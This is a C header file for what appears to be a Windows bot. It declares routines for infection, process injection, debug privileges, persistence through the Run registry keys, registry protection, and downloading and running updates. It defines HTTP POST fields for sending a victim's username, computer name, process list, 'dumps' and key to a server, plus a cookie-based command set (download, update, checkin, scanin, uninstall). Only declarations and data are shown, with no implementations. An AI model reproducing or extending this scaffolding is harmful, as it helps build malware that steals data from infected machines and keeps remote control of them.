#include <wininet.h>

// typedef struct tagLASTINPUTINFO {
//  UINT  cbSize;
//  DWORD dwTime;
// } LASTINPUTINFO, *PLASTINPUTINFO;

typedef BOOL (WINAPI *__GetLastInputInfo)(PLASTINPUTINFO);
__GetLastInputInfo _GetLastInputInfo;

typedef BOOL (WINAPI *mIsWoW64Process) (HANDLE, PBOOL);
mIsWoW64Process IsWoW64ProcessX;

//global funcs
void Update(char *Url);
void Downloader(char *Url);
void Uninstall();
void HttpInteract();
LRESULT CALLBACK DetectShutdown(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam);
void MonitorShutdown();
ULONG_PTR GetParentProcessId();
BYTE *GetDownloadFileSize(char *conf,DWORD *pFileSize);
char *DownloadFile(char *Url, DWORD *pFileSize);
BOOL GetCookie(char *CookieUrl, char *pCommand);
int _atoi(const char *string);
int CopyTill(char *dest,char *src,char c);
void ExecCommands(char *pCommands);
void RandStrA(char *ptr,int len);
void RandStrW(WCHAR *ptr,int len);
void __cdecl _srand(unsigned int seed);
int __cdecl _rand();
void GenUnique(char *ptr);
void GetDebugPrivs();
BOOL IsPCx64();
void _xor(char *src,char *key,int srclen,int keylen);
void base64_encode(unsigned char *input_buffer, size_t input_len,char *output_buffer, size_t output_len);
int base64_decode(const BYTE* pSrc, int nLenSrc, char* pDst, int nLenDst);
void url_decode(char *str, char *buf);
void *_memset(void *s, int c, size_t n);
void *_memcpy(void* dest, const void* src, size_t count);
void GatherInfo(BOOL fFullInfo);
void HttpMain();
void HttpSignaler();
void BeginInjection(BOOL IsChild);
BOOL CheckIfInfected();
void Infect();
void ProtectRegistry();
void MonitorChild();
void DisableOpenFileWarning();
void _entryPoint();
/////////////////////////////////////////////////////////////////



//global vars
DWORD hMutex; //FIXME: I use DWORD, instead of HANDLE, cuz it causes error when i init it.
HINTERNET hOpen;
BOOL bInjected;
BOOL ReportFlag,x64;
BYTE *pBlob,*pHttpData,Uniq[37],BotVersion[20];
DWORD GrowSize,ScanInterval,ConnectInterval,CurPID,ParentPID,ChildPID,CurrentModule;
HANDLE hHeap,hThreadRegistry,hThreadChild,hThreadScan,hCacheMapping,hInteractEvent,hConnectEvent;
CRITICAL_SECTION crsReportFlag,crsBlob;
WCHAR OldLocation[MAX_PATH],CurrentLocation[MAX_PATH],wUniq[37],IEPath[MAX_PATH];
char Key[5],EncodedKey[10];


#define b64str "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"

static BYTE LookupDigits[] = {
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, //gap: ctrl chars
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, //gap: ctrl chars
0,0,0,0,0,0,0,0,0,0,0,           //gap: spc,!"#$%'()*
62,                   // +
 0, 0, 0,             // gap ,-.
63,                   // /
52, 53, 54, 55, 56, 57, 58, 59, 60, 61, // 0-9
 0, 0, 0,             // gap: :;<
99,                   //  = (end padding)
 0, 0, 0,             // gap: >?@
 0, 1, 2, 3, 4, 5, 6, 7, 8, 9,10,11,12,13,14,15,16,
17,18,19,20,21,22,23,24,25, // A-Z
 0, 0, 0, 0, 0, 0,    // gap: [\]^_`
26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,
43,44,45,46,47,48,49,50,51, // a-z    
 0, 0, 0, 0,          // gap: {|}~ (and the rest...)
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
};

//startup reg keys
static char SoftwareName[] = "Software\\Resilience Software";
static char RunPath[] = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
static char AllUsersRunPath[] = ".DEFAULT\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
//////////////////////////////////////////////////

//Processes to skip
static char *SkipProcesses[] = { "svchost.exe","iexplore.exe","explorer.exe","System","smss.exe","csrss.exe","winlogon.exe","lsass.exe","spoolsv.exe","alg.exe","wuauclt.exe",0x00};

//Command line passed to updatebin.exe
static char UpdateMutexMark[] = "UpdateMutex:";

//Cookie name
static char response[] = "response=";

//POST variable names
static char varUID[]           = "page=";
static char varDumps[]         = "&ump=";
static char varIdle[]          = "&opt=";
static char varUsername[]      = "&unm=";
static char varComputername[]  = "&cnm=";
static char varProclist[]      = "&view=";
static char varArch[]          = "&spec=";
static char varOS[]            = "&query=";
static char varKey[]           = "&val=";
static char varVersion[]       = "&var=";

static char ClassName[] = "DetectShutdownClass";

//$ - start of all commands
//# - end of all commands
//; - end of each command

//Commands
static char download[] = "download-";
static char update[]  =   "update-";
static char checkin[] =   "checkin:";
static char scanin[]  =   "scanin:";
static char uninstall[] = "uninstall";
static int fullVarSize = sizeof(varUID) + sizeof(varDumps) + sizeof(varIdle) + sizeof(varUsername) /
                         + sizeof(varComputername) + sizeof(varProclist) + sizeof(varArch) + sizeof(varOS) /
						 + sizeof(varKey) + sizeof(Key) + sizeof(varVersion) + sizeof(BotVersion);

static int runtimeVarSize = sizeof(varUID) + sizeof(varDumps) + sizeof(varIdle) + sizeof(varProclist) /
                            + sizeof(varKey) + sizeof(Key) + sizeof(varVersion) + sizeof(BotVersion);
//////////////////////////



